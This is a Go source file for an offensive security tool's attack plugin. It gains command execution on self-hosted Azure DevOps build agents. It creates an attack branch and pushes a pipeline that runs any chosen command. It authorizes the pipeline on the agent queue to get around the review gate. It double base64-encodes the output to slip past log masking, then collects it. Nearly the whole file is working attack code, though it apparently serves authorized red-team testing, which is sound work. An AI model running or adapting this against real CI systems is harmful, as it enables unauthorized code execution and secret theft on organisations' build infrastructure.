package agentexec

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/detections"
)

func init() {
	registry.RegisterAttackPlugin("azuredevops", "ado-agent-exec", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements command execution on self-hosted Azure DevOps agents
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new ADO agent exec attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ado-agent-exec",
			"Execute commands on self-hosted Azure DevOps agents",
			"azuredevops",
			attacks.CategoryRunners,
		),
	}
}

// CanAttack checks if agent exec attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return common.FindingHasType(findings, detections.VulnSelfHostedAgent)
}

// Execute performs command execution on a self-hosted agent via pipeline creation
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Get ADO client
	client, err := common.GetADOClient(opts.Platform)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Parse project/repo from target value
	project, repo, err := common.ParseProjectRepo(opts.Target.Value)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Resolve the self-hosted pool to target
	poolName, queueID, err := p.resolvePool(ctx, client, project, opts.ExtraOpts)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to resolve pool: %v", err)
		return result, err
	}

	// Get repository to find default branch and repository ID
	repository, err := client.GetRepository(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	defaultBranch := repository.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "refs/heads/main"
	}
	// Strip refs/heads/ prefix
	defaultBranch = strings.TrimPrefix(defaultBranch, "refs/heads/")

	// Get commit ID for default branch
	branches, err := client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var commitID string
	refName := "refs/heads/" + defaultBranch
	for _, branch := range branches {
		if branch.Name == refName {
			commitID = branch.ObjectID
			break
		}
	}

	if commitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find default branch: %s", defaultBranch)
		return result, fmt.Errorf("branch not found: %s", defaultBranch)
	}

	branchName := fmt.Sprintf("trajan-agent-exec-%s", opts.SessionID)
	pipelinePath := "azure-pipelines-trajan-agent-exec.yml"

	// Get command from extra opts or use default
	command := opts.ExtraOpts["command"]
	if command == "" {
		command = "whoami && id && hostname && cat /etc/os-release"
	}

	// Generate pipeline YAML targeting the self-hosted pool
	pipelineYAML := p.generatePipelineYAML(poolName, command)

	if opts.DryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would execute command on self-hosted pool %q via %s/%s", poolName, project, repo)
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  fmt.Sprintf("pipeline:%d", 0), // Placeholder for dry run
				Description: "Pipeline definition",
			},
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  fmt.Sprintf("pipeline:%d", 0),
				Action:      "delete",
				Description: "Delete pipeline definition",
			},
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		result.Data = map[string]interface{}{
			"branch":        branchName,
			"pipeline_path": pipelinePath,
			"project":       project,
			"repo":          repo,
			"pool":          poolName,
			"command":       command,
		}
		return result, nil
	}

	// Create attack branch
	err = client.CreateBranch(ctx, project, repo, branchName, commitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	branches, err = client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var newBranchCommitID string
	newRefName := "refs/heads/" + branchName
	for _, branch := range branches {
		if branch.Name == newRefName {
			newBranchCommitID = branch.ObjectID
			break
		}
	}

	if newBranchCommitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find new branch: %s", branchName)
		return result, fmt.Errorf("branch not found: %s", branchName)
	}

	// Push pipeline YAML to branch
	commitMsg := "Add agent exec pipeline"
	err = client.PushFile(ctx, project, repo, branchName, pipelinePath, pipelineYAML, commitMsg, newBranchCommitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to push pipeline file: %v", err)
		return result, err
	}

	// Create pipeline definition pointing to the YAML
	pipelineReq := azuredevops.CreatePipelineRequest{
		Name:   fmt.Sprintf("trajan-agent-exec-%s", opts.SessionID),
		Folder: "\\",
	}
	pipelineReq.Configuration.Type = "yaml"
	pipelineReq.Configuration.Path = "/" + pipelinePath
	pipelineReq.Configuration.Repository.ID = repository.ID
	pipelineReq.Configuration.Repository.Type = "azureReposGit"

	pipeline, err := client.CreatePipeline(ctx, project, pipelineReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create pipeline: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
		Description: "Pipeline definition created",
	})

	// Authorize pipeline to access the agent queue (bypass "Waiting for review")
	if err := client.AuthorizePipelineResource(ctx, project, "queue", queueID, pipeline.ID); err != nil {
		// Non-fatal: log and continue (pipeline may already be authorized)
		fmt.Printf("Warning: failed to authorize pipeline for agent queue: %v\n", err)
	}

	// Run the pipeline on the attack branch
	runReq := azuredevops.RunPipelineRequest{}
	runReq.Resources.Repositories = map[string]struct {
		RefName string `json:"refName"`
	}{
		"self": {RefName: "refs/heads/" + branchName},
	}

	run, err := client.RunPipeline(ctx, project, pipeline.ID, runReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to run pipeline: %v", err)
		return result, err
	}

	// Poll for build completion - the run ID corresponds to a build
	fmt.Printf("Waiting for build to complete (run ID: %d)...\n", run.ID)
	var build *azuredevops.Build
	for i := 0; i < 60; i++ {
		select {
		case <-ctx.Done():
			fmt.Printf("Timeout: %v\n", ctx.Err())
		case <-time.After(5 * time.Second):
		}
		if ctx.Err() != nil {
			break
		}
		build, err = client.GetBuild(ctx, project, run.ID)
		if err != nil {
			if ctx.Err() != nil {
				fmt.Printf("Timeout: %v\n", ctx.Err())
				break
			}
			fmt.Printf("Warning: failed to get build status: %v\n", err)
			continue
		}
		fmt.Printf("Build status: %s\n", build.Status)
		if build.Status == "completed" {
			break
		}
	}

	// Evaluate build outcome
	if build != nil && build.Status == "completed" {
		if build.Result == "succeeded" {
			// Build succeeded — parse logs for command output
			result.Success = true
			result.Message = fmt.Sprintf("Agent exec pipeline succeeded on pool %q. Pipeline ID: %d, Run ID: %d.",
				poolName, pipeline.ID, run.ID)
			result.Data = map[string]interface{}{
				"branch":        branchName,
				"pipeline_path": pipelinePath,
				"pipeline_id":   pipeline.ID,
				"run_id":        run.ID,
				"project":       project,
				"repo":          repo,
				"pool":          poolName,
				"command":       command,
				"build_result":  build.Result,
			}

			logs, err := client.ListBuildLogs(ctx, project, run.ID)
			if err == nil {
				var allOutput []string
				for _, log := range logs {
					logContent, err := client.GetBuildLog(ctx, project, run.ID, log.ID)
					if err != nil {
						continue
					}
					output := common.ParseDoubleBase64Secrets(string(logContent))
					allOutput = append(allOutput, output...)
				}
				// Deduplicate output (same lines appear in container and step logs)
				seen := make(map[string]bool)
				var deduped []string
				for _, line := range allOutput {
					if !seen[line] {
						seen[line] = true
						deduped = append(deduped, line)
					}
				}
				allOutput = deduped
				if len(allOutput) > 0 {
					if m, ok := result.Data.(map[string]interface{}); ok {
						m["output"] = allOutput
						m["output_lines"] = len(allOutput)
					}
					result.Message = fmt.Sprintf("Agent exec successful on pool %q. Pipeline ID: %d, Run ID: %d. Captured %d output lines.",
						poolName, pipeline.ID, run.ID, len(allOutput))
				}
			} else {
				fmt.Printf("Warning: failed to list build logs: %v\n", err)
			}
		} else {
			// Build completed but failed (result: "failed", "canceled", etc.)
			result.Success = false
			result.Message = fmt.Sprintf("Build failed on pool %q. Pipeline ID: %d, Run ID: %d, Result: %s.",
				poolName, pipeline.ID, run.ID, build.Result)
			result.Data = map[string]interface{}{
				"branch":        branchName,
				"pipeline_path": pipelinePath,
				"pipeline_id":   pipeline.ID,
				"run_id":        run.ID,
				"project":       project,
				"repo":          repo,
				"pool":          poolName,
				"command":       command,
				"build_result":  build.Result,
			}

			// Still try to parse logs for error details
			logs, err := client.ListBuildLogs(ctx, project, run.ID)
			if err == nil {
				var allOutput []string
				for _, log := range logs {
					logContent, err := client.GetBuildLog(ctx, project, run.ID, log.ID)
					if err != nil {
						continue
					}
					output := common.ParseDoubleBase64Secrets(string(logContent))
					allOutput = append(allOutput, output...)
				}
				// Deduplicate output (same lines appear in container and step logs)
				seen := make(map[string]bool)
				var deduped []string
				for _, line := range allOutput {
					if !seen[line] {
						seen[line] = true
						deduped = append(deduped, line)
					}
				}
				allOutput = deduped
				if len(allOutput) > 0 {
					if m, ok := result.Data.(map[string]interface{}); ok {
						m["output"] = allOutput
						m["output_lines"] = len(allOutput)
					}
				}
			}
		}
	} else if build != nil {
		result.Success = false
		result.Message = fmt.Sprintf("Build did not complete in time. Pipeline ID: %d, Run ID: %d, Status: %s.",
			pipeline.ID, run.ID, build.Status)
		result.Data = map[string]interface{}{
			"branch":        branchName,
			"pipeline_path": pipelinePath,
			"pipeline_id":   pipeline.ID,
			"run_id":        run.ID,
			"project":       project,
			"repo":          repo,
			"pool":          poolName,
			"command":       command,
		}
	} else {
		result.Success = false
		result.Message = fmt.Sprintf("Could not retrieve build status. Pipeline ID: %d, Run ID: %d.",
			pipeline.ID, run.ID)
		result.Data = map[string]interface{}{
			"branch":        branchName,
			"pipeline_path": pipelinePath,
			"pipeline_id":   pipeline.ID,
			"run_id":        run.ID,
			"project":       project,
			"repo":          repo,
			"pool":          poolName,
			"command":       command,
		}
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
			Action:      "delete",
			Description: "Delete pipeline definition",
		},
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// resolvePool resolves the self-hosted pool to target, either from explicit --pool flag or auto-discovery.
// Returns the pool name, queue ID (needed for pipeline authorization), and any error.
func (p *Plugin) resolvePool(ctx context.Context, client *azuredevops.Client, project string, extraOpts map[string]string) (string, int, error) {
	if poolName, ok := extraOpts["pool"]; ok && poolName != "" {
		// Explicit pool specified — validate it exists and is self-hosted
		pools, err := client.ListAgentPools(ctx)
		if err != nil {
			return "", 0, fmt.Errorf("listing agent pools: %w", err)
		}

		var found bool
		for _, pool := range pools {
			if pool.Name == poolName {
				found = true
				if pool.IsHosted {
					return "", 0, fmt.Errorf("pool %q is Microsoft-hosted, not self-hosted", poolName)
				}
				break
			}
		}
		if !found {
			return "", 0, fmt.Errorf("pool %q not found", poolName)
		}

		// Verify the pool is accessible from this project via agent queues
		queues, err := client.ListAgentQueues(ctx, project)
		if err != nil {
			return "", 0, fmt.Errorf("listing agent queues: %w", err)
		}

		var accessible bool
		var queueID int
		for _, queue := range queues {
			if queue.Pool.Name == poolName {
				accessible = true
				queueID = queue.ID
				break
			}
		}
		if !accessible {
			return "", 0, fmt.Errorf("pool %q is not accessible from project %q", poolName, project)
		}

		return poolName, queueID, nil
	}

	// Auto-discover: find self-hosted pools accessible from this project
	queues, err := client.ListAgentQueues(ctx, project)
	if err != nil {
		return "", 0, fmt.Errorf("listing agent queues: %w", err)
	}

	type poolInfo struct {
		name    string
		queueID int
	}

	var selfHostedPools []poolInfo
	seen := make(map[string]bool)
	for _, queue := range queues {
		if !queue.Pool.IsHosted && !seen[queue.Pool.Name] {
			selfHostedPools = append(selfHostedPools, poolInfo{name: queue.Pool.Name, queueID: queue.ID})
			seen[queue.Pool.Name] = true
		}
	}

	switch len(selfHostedPools) {
	case 0:
		return "", 0, fmt.Errorf("no self-hosted pools accessible from project %q", project)
	case 1:
		return selfHostedPools[0].name, selfHostedPools[0].queueID, nil
	default:
		names := make([]string, len(selfHostedPools))
		for i, p := range selfHostedPools {
			names[i] = p.name
		}
		return "", 0, fmt.Errorf("multiple self-hosted pools found, use --pool to specify: %s", strings.Join(names, ", "))
	}
}

// generatePipelineYAML generates the pipeline YAML for command execution on a self-hosted pool
func (p *Plugin) generatePipelineYAML(poolName, command string) string {
	if command == "" {
		command = "whoami && id && hostname && cat /etc/os-release"
	}

	return fmt.Sprintf(`trigger: none

pool:
  name: '%s'

steps:
  - script: |
      echo "=== Agent Exec - Trajan ==="
      (%s) 2>&1 | while IFS= read -r line; do
        echo "$line" | base64 | tr -d '\n' | base64 | tr -d '\n'
        echo ""
      done
    displayName: 'Execute Command'
`, poolName, command)
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	client, err := common.GetADOClient(session.Platform)
	if err != nil {
		return err
	}

	// We need project/repo from target
	project, repo, err := common.ParseProjectRepo(session.Target.Value)
	if err != nil {
		return err
	}

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactWorkflow:
				// Parse pipeline ID from identifier "pipeline:<ID>"
				var pipelineID int
				if _, err := fmt.Sscanf(action.Identifier, "pipeline:%d", &pipelineID); err != nil {
					fmt.Printf("Failed to parse pipeline ID from %s: %v\n", action.Identifier, err)
					continue
				}

				if err := client.DeletePipeline(ctx, project, pipelineID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Pipeline %d already deleted or doesn't exist\n", pipelineID)
						continue
					}
					return fmt.Errorf("deleting pipeline %d: %w", pipelineID, err)
				}

			case attacks.ArtifactBranch:
				// Get branch commit ID for deletion
				branches, err := client.ListGitBranches(ctx, project, repo)
				if err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("listing branches for deletion: %w", err)
				}

				var commitID string
				refName := "refs/heads/" + action.Identifier
				for _, branch := range branches {
					if branch.Name == refName {
						commitID = branch.ObjectID
						break
					}
				}

				if commitID == "" {
					fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
					continue
				}

				if err := client.DeleteBranch(ctx, project, repo, action.Identifier, commitID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}
